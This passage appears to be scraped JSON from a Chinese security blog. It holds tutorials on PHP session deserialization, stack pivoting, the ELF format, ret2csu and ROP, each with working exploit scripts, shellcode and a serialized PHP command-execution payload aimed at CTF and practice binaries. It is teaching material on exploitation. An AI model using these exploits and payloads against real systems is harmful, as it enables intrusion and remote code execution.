$this-&gt;varr = new foo2(); &#125;&#125; echo serialize(new foo1());?&gt; form.html，一个向i.php提交POST请求的表单文件，其中包括PHP_SESSION_UPLOAD_PROGRESS变量： 12345&lt;form action=\"http://127.0.0.1/i.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; Burpsuite截断该form.html发送的POST请求，在PHP_SESSION_UPLOAD_PROGRESS一栏中的值加上poc.php生成的poc就能够成功执行命令了： 1|O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:19:&quot;system(&quot;ipconfig&quot;);&quot;;&#125;&#125;&#125; 换其他命令的话直接换poc.php生成的poc即可： 0x04 参考关于PHP SESSION反序列化","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"花式栈溢出之stack pivoting","date":"2019-04-20T11:50:19.000Z","path":"2019/04/20/花式栈溢出之stack-pivoting/","text":"0x01 stack pivotingstack pivoting，即劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。 什么情况下需要利用stack pivot? 栈溢出的字节比较少，无法直接利用溢出字节进行ROP； 开启了 PIE 保护，栈地址未知并且无法泄露，但是利用某些利用技术时必须要知道栈地址，就可以通过stack pivot将栈劫持到相应的区域； stack pivot能够使得一些非栈溢出的漏洞变成为栈溢出漏洞从而进行攻击，典型：可以将程序劫持到heap空间中； stack pivot有什么利用条件? 1、存在内容可控的内存，位置已知，拥有读写的权限，有几个典型的位置可供选择： （1）一个是bss段末有较大的空间，因为进程内存按页分配，分配给bss段的内存大小至少一个页(4k，x1000)大小，一般bss段的内容是用不了这么大的空间的，并且bss段分配的内存页拥有读写权限，是stack pivot的好目标； （2）另一个是heap空间，这个不用赘述了，但是需要注意泄露堆地址； 2、控制rsp(esp)。一般来说，控制栈指针会使用 ROP，需要相应的Gadgets，常见的控制栈指针的Gadgets一般是： 1pop rsp/esp 其中有一个最典型，在x64的libc_csu_init通过Godgets中，做一个适当偏移能够得到这样一个Gadgets： 123456789101112131415mov rdx,r13mov rsi,r14mov edi,r15dcall QWORD PTR [r12+rbx*8]add rbx,0x1cmp rbx,rbpjne 405660 &lt;__libc_csu_init+0x40&gt;add rsp,0x8pop rbxpop rbp offset: pop rsppop r12 pop r12pop r13 pop r13 pop r14 pop r14pop r15 pop r15retn ret 可见其实就是ret2csu的经典Gadget，是一个pop rsp ret，如果将ret的地址改成leave ，ret,那么我们正常通过pop rbp；pop r12;pop r13;pop r14执行到返回时，将rbp中的值相应设置好也可以劫持rsp。 或者其他诸如add rsp，0x100等能够劫持rsp寄存器值的Gadget。 stack pivoting适用场景： 我们控制了橙色部分区域，但是中间有一段不可控制的内存，这时，我们需要控制rsp跳转到橙色部分，继续执行我们的Rop指令，这就是stack pivot，如下图是最简单的一种，通过add esp, 0x40c;ret的gadget来实现劫持栈指针： 以下的一些Gadgets都是可以通过对esp的操作来实现劫持栈指针： 0x02 X-CTF Quals 2016 - b0verfl0w题目下载地址 运行程序，询问名字并输入内容，再输出出来；查看程序是个32位的动态链接文件；查看安全编译选项，发现啥都没开： GDB计算溢出至ret处的偏移量为36： 打开IDA分析： 这里看到是通过fgets()来获取用户输入内容，存在明显的栈溢出漏洞，限定了只能输入50个字节；同时看到变量s相对ebp的偏移量为20h=16*2d=32d，再加上ebp的4个字节就和前面计算的溢出偏移量是一致的。 由此可以算出能够溢出的字节数为50-36=14。 shellcode选择 这里因为没有开启NX，所以我们可以直接在栈上写shellcode。 我们来看下pwntools的shellcode长度是多少： 12ski12@ubuntu:~/ctf/pwn/stack$ python -c \"from pwn import *;print len(asm(shellcraft.sh()))\"44 可以看到是44个字节。而我们知道变量s处到ret处的偏移量为36个字节，是塞不下这个shellcode的。 那就换一个更简短的shellcode如下： 1\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80 看下该shellcode的长度： 123456789101112ski12@ubuntu:~/ctf/pwn/stack$ python -c \"from pwn import *;print disasm('\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80')\" 0: 31 c9 xor ecx,ecx 2: f7 e1 mul ecx 4: 51 push ecx 5: 68 2f 2f 73 68 push 0x68732f2f a: 68 2f 62 69 6e push 0x6e69622f f: 89 e3 mov ebx,esp 11: b0 0b mov al,0xb 13: cd 80 int 0x80ski12@ubuntu:~/ctf/pwn/stack$ python -c \"print len('\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80')\"21 13h+2=15h=21d，即shellcode长度为21个字节，满足条件。 寻找Gadget shellcode的问题搞定了，接着是ret处应该覆盖为shellcode的起始地址即ret2shellcode，但是这里有个问题，系统开启了ASLR，因此栈地址是随机的，我们无法预测。解决办法是利用相对地址即可，如上一节最后提到的几个对esp进行偏移量操作的Gadgets。 这里就用到经典的方法：jmp esp。 因为在函数ret的时候，esp刚好指向ret地址的下一个地址；而当我们找到如jmp esp的gadget并覆盖到ret地址时，就可以跳到下一个地址去执行这个gadget地址后面的指令。 搜索到了一个jmp esp的Gadget： 找到目标Gadget为0x08048504。剩下的后面的指令就是需要ret2shellcode执行了。 那么可以知道我们构造的payload其结构如下： 1shellcode|padding|fake ebp|jmp esp|set esp point to shellcode and jmp esp 参考前面小节提到的几个Gadgets，我们可以通过sub esp, 0xXX;jmp esp这个来实现ret2shellcode，因为我们没有办法直接ret到指定的shellcode代码处（原因是ASLR），只能通过相对地址的方式实现跳转；这里就用sub esp, 0xXX来实现相对地址的跳转，因为当前esp指向本地址，而我们可以算出shellcode起始地址里该地址的相对偏移量为20h(shellcode+padding)+4(fake ebp)+4(jmp esp)=28h，当使用sub esp, 0x28时可以使esp指向shellcode起始地址处 ；最后在jmp esp跳转至修改后的esp指向的地址即shellcode起始地址。 简单地说，就是将修改esp指向shellcode起始地址，然后再跳到esp指向地址去执行从而执行shellcode。 现在我们再算下整个payload的长度，我们已知shellcode起始地址到最后sub esp, 0x28;jmp esp这段Gadget处的偏移量为28h=40d，而这段Gadget的长度如下： 12ski12@ubuntu:~/ctf/pwn/stack$ python -c &quot;from pwn import *;print len(asm(&apos;sub esp, 0x28;jmp esp&apos;))&quot;5 整个长度为40+5=45&lt;50，满足只能输入50个字节以内内容的限制。 整个payload结构如下图所示： 编写payload： 12345678910111213141516from pwn import *p = process(\"./b0verfl0w\")shellcode = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"sub_esp_jmp = asm(\"sub esp, 0x28;jmp esp\")jmp_esp = 0x08048504payload = shellcode.ljust(0x20, \"A\") + \"BBBB\" + p32(jmp_esp) + sub_esp_jmpp.recvuntil(\"name?\")print \"[*]sending payload...\"p.sendline(payload)p.interactive() 0x03 参考stack pivoting ROP and DEP","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"ELF二进制格式","date":"2019-04-15T13:39:27.000Z","path":"2019/04/15/ELF二进制格式/","text":"在Linux、BSD变体以及其他OS中，ELF格式可用于可执行文件、共享库、目标文件、coredump文件，甚至内核引导镜像文件。在Linux中，程序就是以ELF二进制的格式执行的。 0x01 ELF文件类型一个ELF文件可以被标记为一下几种类型之一。 ET_NONE：未知类型。这个标记表明文件类型不确定，或者未定义。 ET_REL：重定位文件。ELF类型标记为relocatable意味着该文件被标记为了一段可重定位的代码，有时也称为目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码（position independent code）。在编译完代码之后通常可以看到一个.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据。 ET_EXEC：可执行文件。executable，表明该文件被标记为可执行文件，也称为程序，是一个进程开始执行的入口。 ET_DYN：共享目标文件。dynamic，意味着文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中。 ET_CORE：核心文件。在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用GDB读取这类文件来辅助调试并查找程序崩溃的原因。 使用readelf -h命令查看ELF文件，可以看到原始的ELF文件头。ELF文件头从文件的0偏移量开始，是除了文件头之后剩余部分文件的一个映射。文件头主要标记了ELF类型、结构和程序开始执行的入口地址，并提供了其他ELF头（节头和程序头）的偏移量。 可以通过查看Linux的ELF（5）手册来了解ELF头部结构： 1234567891011121314151617#define EI_NIDENT 16typedef struct &#123; unsigned char e_ident[EI_NIDENT]; uint16_t e_type; uint16_t e_machine; uint32_t e_version; ElfN_Addr e_entry; ElfN_Off e_phoff; ElfN_Off e_shoff; uint32_t e_flags; uint16_t e_ehsize; uint16_t e_phentsize; uint16_t e_phnum; uint16_t e_shentsize; uint16_t e_shnum; uint16_t e_shstrndx;&#125; ElfN_Ehdr; 0x02 ELF程序头ELF程序头是对二进制文件中段的描述，是程序装载必需的一部分。 段（segment）是在内核装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。可以通过引用原始ELF头中名为e_phoff（程序头表偏移量）来得到程序头表（如前面的ElfN_Ehdr结构中所示）。 程序头描述了可执行文件（包括共享库）中的段及其类型。 Elf32_Phdr结构体如下，它构成了32位ELF可执行程序头表的一个程序头条目： 12345678910typedef struct &#123; uint32_t p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; uint32_t p_filesz; uint32_t p_memsz; uint32_t p_flags; uint32_t p_align;&#125; Elf32_Phdr; 下面说下5种常见的程序头类型。 2.1 PT_LOAD一个可执行文件至少有一个PT_LOAD类型的段，该段描述的是可装载的段，即该类段将被装载或者映射到内存中。","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"}]},{"title":"栈溢出之ret2csu","date":"2019-04-12T13:30:11.000Z","path":"2019/04/12/中级ROP之ret2csu/","text":"0x01 ret2csuCTF Wiki 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别) 这里我们以本地编译的蒸米示例的level5为例，用objdump -d level5命令即可查看到以下内容： 12345678910111213141516171819202122232425262728293031323334353637383900000000004005c0 &lt;__libc_csu_init&gt;: 4005c0: 41 57 push %r15 4005c2: 41 56 push %r14 4005c4: 41 89 ff mov %edi,%r15d 4005c7: 41 55 push %r13 4005c9: 41 54 push %r12 4005cb: 4c 8d 25 3e 08 20 00 lea 0x20083e(%rip),%r12 # 600e10 &lt;__frame_dummy_init_array_entry&gt; 4005d2: 55 push %rbp 4005d3: 48 8d 2d 3e 08 20 00 lea 0x20083e(%rip),%rbp # 600e18 &lt;__init_array_end&gt; 4005da: 53 push %rbx 4005db: 49 89 f6 mov %rsi,%r14 4005de: 49 89 d5 mov %rdx,%r13 4005e1: 4c 29 e5 sub %r12,%rbp 4005e4: 48 83 ec 08 sub $0x8,%rsp 4005e8: 48 c1 fd 03 sar $0x3,%rbp 4005ec: e8 0f fe ff ff callq 400400 &lt;_init&gt; 4005f1: 48 85 ed test %rbp,%rbp 4005f4: 74 20 je 400616 &lt;__libc_csu_init+0x56&gt; 4005f6: 31 db xor %ebx,%ebx 4005f8: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 4005ff: 00 400600: 4c 89 ea mov %r13,%rdx 400603: 4c 89 f6 mov %r14,%rsi 400606: 44 89 ff mov %r15d,%edi 400609: 41 ff 14 dc callq *(%r12,%rbx,8) 40060d: 48 83 c3 01 add $0x1,%rbx 400611: 48 39 eb cmp %rbp,%rbx 400614: 75 ea jne 400600 &lt;__libc_csu_init+0x40&gt; 400616: 48 83 c4 08 add $0x8,%rsp 40061a: 5b pop %rbx 40061b: 5d pop %rbp 40061c: 41 5c pop %r12 40061e: 41 5d pop %r13 400620: 41 5e pop %r14 400622: 41 5f pop %r15 400624: c3 retq 400625: 90 nop 400626: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 40062d: 00 00 00 这里我们可以利用以下几点： 从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据； 从 0x0000000000400600 到 0x0000000000400609，我们可以将r13赋给rdx，将r14赋给rsi，将r15d赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx + 1 = rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。 BlackHat 2018 该项技术在BlackHat 2018中介绍过，下面用其PPT来说下。 先编写一个代码量很小的C代码，编译该C文件之后会看到存在大量代码，除去源代码部分，剩下的代码都成为Attached Code即附属代码： 这些Attached Code的攻击是多有效呢？ 下面看下这两段可以利用的Gadgets，具体的描述前面已讲解，这里的图片更具体地表现出来了： 将两段Gadgets连接起来构造出ROP链，从而可以实现调用任意含有3个参数的函数： 利用write()函数泄露libc地址： 最终构造的ROP链： 什么时候适合应用ret2csu呢？ 0x02 Securinets CTF baby1这里以Securinets CTF的一道Pwn题baby1为例。 程序先输出一段内容，然后让你输入东西后即退出；是个动态链接文件，会加载libc；安全编译选项只开启了NX： IDA分析下，存在明显的栈溢出漏洞，但在程序中找不到system()函数和”/bin/sh”字符串，但是可看到其是存在read()、write()和__libc_csu_init()函数的，由此可以联想到可以利用ret2csu技术来实现攻击： 通过objdump -d baby1命令查看__libc_csu_init()函数的gadgets： 1234567891011121314151617181920212223242526272829303132333435363738390000000000400660 &lt;__libc_csu_init&gt;: 400660: 41 57 push %r15 400662: 41 56 push %r14 400664: 41 89 ff mov %edi,%r15d 400667: 41 55 push %r13 400669: 41 54 push %r12 40066b: 4c 8d 25 9e 07 20 00 lea 0x20079e(%rip),%r12 # 600e10 &lt;__frame_dummy_init_array_entry&gt; 400672: 55 push %rbp 400673: 48 8d 2d 9e 07 20 00 lea 0x20079e(%rip),%rbp # 600e18 &lt;__init_array_end&gt; 40067a: 53 push %rbx 40067b: 49 89 f6 mov %rsi,%r14 40067e: 49 89 d5 mov %rdx,%r13 400681: 4c 29 e5 sub %r12,%rbp 400684: 48 83 ec 08 sub $0x8,%rsp 400688: 48 c1 fd 03 sar $0x3,%rbp 40068c: e8 e7 fd ff ff callq 400478 &lt;_init&gt; 400691: 48 85 ed test %rbp,%rbp 400694: 74 20 je 4006b6 &lt;__libc_csu_init+0x56&gt; 400696: 31 db xor %ebx,%ebx 400698: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 40069f: 00 4006a0: 4c 89 ea mov %r13,%rdx 4006a3: 4c 89 f6 mov %r14,%rsi 4006a6: 44 89 ff mov %r15d,%edi 4006a9: 41 ff 14 dc callq *(%r12,%rbx,8) 4006ad: 48 83 c3 01 add $0x1,%rbx 4006b1: 48 39 eb cmp %rbp,%rbx 4006b4: 75 ea jne 4006a0 &lt;__libc_csu_init+0x40&gt; 4006b6: 48 83 c4 08 add $0x8,%rsp 4006ba: 5b pop %rbx 4006bb: 5d pop %rbp 4006bc: 41 5c pop %r12 4006be: 41 5d pop %r13 4006c0: 41 5e pop %r14 4006c2: 41 5f pop %r15 4006c4: c3 retq 4006c5: 90 nop 4006c6: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 4006cd: 00 00 00 可以确定gadget1的地址为0x4006ba，gadget2的地址为0x4006a0。 GDB调试，使用pattern计算溢出字节为56： 这里我参考另一篇博文《蒸米32位及64位ROP笔记》中level5的第二种做法，我们再找一个pop rdi;ret的gadget： 找到该gadget地址为0x4006c3。 仿照level5写payload就好（具体的解释可以看《蒸米32位及64位ROP笔记》）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *from LibcSearcher import *p = remote(\"192.168.17.157\", 10001)p.recv(1024)elf = ELF(\"./baby1\")gadget1 = 0x4006bagadget2 = 0x4006a0pop_rdi_ret_addr = 0x00000000004006c3main_addr = elf.symbols[\"main\"]write_got = elf.got[\"write\"]print \"[*]main() addr: \" + hex(main_addr)print \"[*]write() got: \" + hex(write_got)def csu(rbx, rbp, r12, r13, r14, r15, ret): payload = \"A\" * 56 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += \"B\" * 56 payload += p64(ret) return payloadprint \"[*]sending payload to leak write() addr...\"payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)p.sendline(payload)sleep(1)write_addr = u64(p.recv(8))print \"[*]leak write() addr: \" + hex(write_got)p.recv(1024)libc = LibcSearcher(\"write\", write_addr)libc_base = write_addr - libc.dump(\"write\")system_addr = libc_base + libc.dump(\"system\")binsh_addr = libc_base + libc.dump(\"str_bin_sh\")print \"[*]libc base: \" + hex(libc_base)print \"[*]system() addr: \" + hex(system_addr)print \"[*]/bin/sh addr: \" + hex(binsh_addr)print \"[*]sending exp...\"exp = \"A\" * 56exp += p64(pop_rdi_ret_addr)exp += p64(binsh_addr)exp += p64(system_addr)p.sendline(exp)p.interactive() 这里打远程的机子： 0x03 参考ret2csu return2csu学习笔记","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"蒸米32位及64位ROP笔记","date":"2019-04-09T13:39:23.000Z","path":"2019/04/09/蒸米ROP学习笔记/","text":"这里将《一步一步学 ROP 之 Linux_x86 篇》和《一步一步学 ROP 之 Linux_64 篇》中的例子做一遍并记录下来。 0x01 32位ROPlevel1——栈上执行shellcodelevel1主要演示32位程序中最基本的栈溢出利用，可直接在栈上写shellcode并执行。 level1.c： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv) &#123; vulnerable_function(); write(STDOUT_FILENO, \"Hello, World\\n\", 13);&#125; 使用如下指令编译： 1gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c -m32参数指定编译为32位程序；-fno-stack-protector参数指定不开启堆栈溢出保护，即不生成 canary；-z execstack参数指定允许栈执行，即不开启NX。 下面3条指令用来关闭整个linux系统的ASLR保护： 123sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_spaceexit 运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开： 利用pattern计算偏移，可得到溢出偏移量为140： 由此，我们可以构造”A”*140+shellcode_addr即可将shellcode地址覆盖到函数返回地址中，从而让EIP指针寄存器指向shellcode地址让程序执行shellcode。 这里NX没开，我们可以直接往栈上写shellcode，具体为shellcode+”A”*(140-len(shellcode))+shellcode_addr。 shellcode的构造直接用pwntools的asm(shellcraft.sh())来获得。 下面获取写入的shellcode地址。由于ASLR等都关掉，因此现在获取的地址就不会变了。 一个GDB的坑 在GDB中调试level1，r运行，再输入”abcdaaaaa……”让程序崩溃，然后输入x/10s \\$esp-144（144是由前面得到的140偏移再加上4字节的ret得到的）： 得到shellcode输入位置的偏移为0xffffcf70。 写payload： 123456789from pwn import *p = process(\"./level1\")shellcode = asm(shellcraft.sh())shellcode_addr = 0xffffcf70payload = shellcode.ljust(140, \"A\") + p32(shellcode_addr)p.sendline(payload)p.interactive() 然而在运行时会报错，无法正常利用。 填坑 对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？ 最简单的方法就是开启core dump这个功能。 12ulimit -c unlimitedsudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos; 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 由此得到shellcode真正的地址0xffffcfb0。 改下payload的地址即可getshell： 123456789from pwn import *p = process(\"./level1\")shellcode = asm(shellcraft.sh())shellcode_addr = 0xffffcfb0payload = shellcode.ljust(140, \"A\") + p32(shellcode_addr)p.sendline(payload)p.interactive() 除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上： 1socat tcp-l:10001,fork exec:./level1 payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址： 得到ret地址为0xffffcf00，改下payload即可远程getshell： level2——ret2libc绕过NX一样的代码，只不过在用GCC编译开启NX保护即栈不可执行。 1gcc -m32 -fno-stack-protector -o level2 level1.c 这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。 既然开启了NX，那一般是利用ROP绕过，这里用的是ret2libc，因为程序level2调用了libc.so，并且libc.so里保存了大量可利用的函数如system()和/bin/sh，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。 下面的问题就变为怎么获取libc中的system和binsh的地址。 因为我们关掉了ASLR，此时system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。 此时我们可以使用GDB进行调试，在main打下断点然后运行，程序在main断点处停下再通过print和find命令来查找system和”/bin/sh”字符串的地址： system()函数地址为：0xf7e42940 /bin/sh地址为：0xf7f6102b 至于溢出偏移量和level1一样为140。 编写payload： 1234567891011from pwn import *p = process(\"./level2\")system_addr = 0xf7e42940binsh_addr = 0xf7f6102bpayload = \"A\" * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)p.sendline(payload)p.interactive() level2——ROP绕过NX和ASLR在前一小节的基础下，开启在level1中关掉的ASLR： 123sudo -secho 2 &gt; /proc/sys/kernel/randomize_va_spaceexit 如果你通过sudo cat /proc/[pid]/maps或者ldd查看，你会发现level2的libc.so地址每次都是变化的： 此时利用前一小节的办法print和find是获取不到对的地址的，因为每次运行栈的地址都会变化。 如何利用呢？——思路是：先泄漏出libc.so某些函数在内存中的地址，再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，最后执行我们的ret2libc的shellcode。既然栈、libc、堆的地址都是随机的，我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示，Linux内存随机化分布图： 所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。 首先我们利用objdump来查看可以利用的plt函数和函数对应的got表： 除了程序本身的函数之外，还有read@plt()和write@plt()函数可用，但因为程序本身没有调用system()函数因此并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。 既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书） 因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。 然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。 使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址： 当然，除了用ldd命令查看libc.so库，还可以直接用pwntools库的elf.libc来获取libc.so库： 123from pwn import *elf = ELF(\"./level2\")libc = elf.libc 编写payload： 123456789101112131415161718192021222324252627282930313233from pwn import *#p = process(\"./level2\")p = remote(\"127.0.0.1\", 10001)elf = ELF(\"./level2\")libc = elf.libcwrite_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]vulnerable_function_addr = elf.symbols[\"vulnerable_function\"]print \"[*]write() plt: \" + hex(write_plt)print \"[*]write() got: \" + hex(write_got)print \"[*]vulnerable_function() addr: \" + hex(vulnerable_function_addr)payload = \"A\" * 140 + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(4)print \"[*]sending payload1 to leak write libc addr...\"p.sendline(payload)write_addr = u32(p.recv(4))print \"[*]leak write libc addr: \" + hex(write_addr)libc.address = write_addr - libc.symbols[\"write\"]system_addr = libc.symbols[\"system\"]binsh_addr = next(libc.search(\"/bin/sh\"))print \"[*]system() addr: \" + hex(system_addr)print \"[*]binsh addr: \" + hex(binsh_addr)payload2 = \"A\" * 140 + p32(system_addr) + p32(0xdeedbeef) + p32(binsh_addr)print \"[*]sending payload2 to getshell...\"p.sendline(payload2)p.interactive() 另一种是ldd命令查找再赋值libc.so文件到当前目录再加载的payload： 123456789101112131415161718192021222324252627282930313233343536from pwn import *#p = process(\"./level2\")p = remote(\"127.0.0.1\", 10001)elf = ELF(\"./level2\")libc = ELF(\"libc.so.6\")#libc = elf.libcwrite_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]vulnerable_function_addr = elf.symbols[\"vulnerable_function\"]print \"[*]write() plt: \" + hex(write_plt)print \"[*]write() got: \" + hex(write_got)print \"[*]vulnerable_function() addr: \" + hex(vulnerable_function_addr)payload = \"A\" * 140 + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(4)print \"[*]sending payload1 to leak write libc addr...\"p.sendline(payload)write_addr = u32(p.recv(4))print \"[*]leak write libc addr: \" + hex(write_addr)#libc.address = write_addr - libc.symbols[\"write\"]system_addr = libc.symbols[\"system\"] + write_addr - libc.symbols[\"write\"]binsh_addr = next(libc.search(\"/bin/sh\")) + write_addr - libc.symbols[\"write\"]print \"[*]system() addr: \" + hex(system_addr)print \"[*]binsh addr: \" + hex(binsh_addr)payload2 = \"A\" * 140 + p32(system_addr) + p32(0xdeedbeef) + p32(binsh_addr)print \"[*]sending payload2 to getshell...\"p.sendline(payload2)p.interactive() level2——Memory Leak &amp; DynELF本小节介绍了在不获取目标libc.so的情况下进行ROP攻击。 前面一小节我们用到了目标机器的libc.so才能计算出libc中system()和/bin/sh等的地址来实现攻击，但是如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。 这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的： 123456def leak(address): payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4) p.send(payload1) data = p.recv(4) print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return data 随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。 要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。 当然，可以在pwntools中直接调用elf.bss()获取.bss段地址： 12elf = ELF(\"./level2\")bss_base = elf.bss() 因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这里我们用ROPgadget来寻找： 编写payload： 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *p = remote(\"127.0.0.1\", 10001)#p = process(\"./level2\")elf = ELF(\"./level2\")bss_base = elf.bss()plt_write = elf.plt[\"write\"]plt_read = 